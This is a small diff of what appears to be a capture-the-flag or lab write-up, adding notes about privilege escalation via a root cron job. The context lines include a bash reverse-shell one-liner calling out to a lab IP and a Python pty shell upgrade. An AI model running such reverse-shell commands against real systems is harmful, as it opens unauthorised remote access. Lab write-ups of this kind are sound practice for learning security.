@@ -166,4 +166,5 @@ bash -i >& /dev/tcp/10.10.14.13/6969 0>&1
 python3 -c 'import pty; pty.spawn("/bin/bash")'
 ```
 * I tried `sudo -l` again, but I needed a password to run that :/
-* 
+* I looked at the running processes and saw that the site, and therefore my shell, was running off of a root cron job
+	* Only problem is I have no clue how to exploit that
